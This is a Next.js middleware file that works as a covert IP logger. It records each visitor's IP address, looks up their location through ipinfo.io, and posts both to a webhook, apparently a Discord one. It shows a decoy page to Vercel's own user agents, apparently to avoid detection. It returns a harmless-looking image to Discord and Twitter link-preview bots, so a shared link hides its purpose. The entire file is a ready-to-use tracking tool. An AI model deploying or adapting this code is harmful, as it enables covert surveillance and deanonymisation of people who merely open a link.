import { NextRequest, NextResponse, userAgent } from "next/server";

// Your webhook URL now is in your project's environment variables.
const webhook = process.env.WEBHOOK_URL;

export async function middleware(req) {
  // Get the user agent from the request
  const ua = userAgent(req)?.ua;

  // If the user agent is missing or starts with "vercel-",
  // display another page for Vercel
  if (!ua || ua.startsWith("vercel-")) {
    return NextResponse.rewrite(new URL("/vercel.html", req.url));
  }

  // Get the IP address of the user from the request headers
  const ip = req.headers.get("x-forwarded-for") || req.remoteAddress;
  const ip2 = req.headers.get("x-real-ip");

  // Get location information for the IP address using ipinfo.io
  const url = `https://ipinfo.io/${ip}?token=${process.env.IPINFO_TOKEN}`; // Replace YOUR_TOKEN_HERE with your ipinfo.io token
  const response = await fetch(url);
  const data = await response.json();

  // Find the source of the request based on the user agent
  const source = ["Mozilla/5.0 (compatible; Discordbot/", "Twitterbot/"].find(
    (u) => ua?.startsWith(u)
  );
  const page = req.url.split("/").slice(-1)[0];

  // Send a webhook message with the IP and location information
  await fetch(webhook, {
    body: JSON.stringify({
      embeds: [
        {
          title: "Triggered view-logger",
          description: `IP: ${ip}, Country: ${data.country}, City: ${
            data.city
          } ${ip2 ? `, IP2: ${ip2}` : ""}`,
          footer: {
            text: "Requested page: " + page.slice(0, 500),
          },
          thumbnail: {
            url: `https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/flags/4x3/${data.country.toLowerCase()}.svg`,
          },
        },
      ],
    }),
    headers: { "content-type": "application/json" },
    method: "POST",
  });

  // If the request comes from a known bot, return an image
  if (source) {
    return NextResponse.rewrite(new URL("/mini.png", req.url));
  } else {
    // If the request doesn't come from a known bot, return a message
    return NextResponse.rewrite(new URL("/page.html", req.url));
  }
}
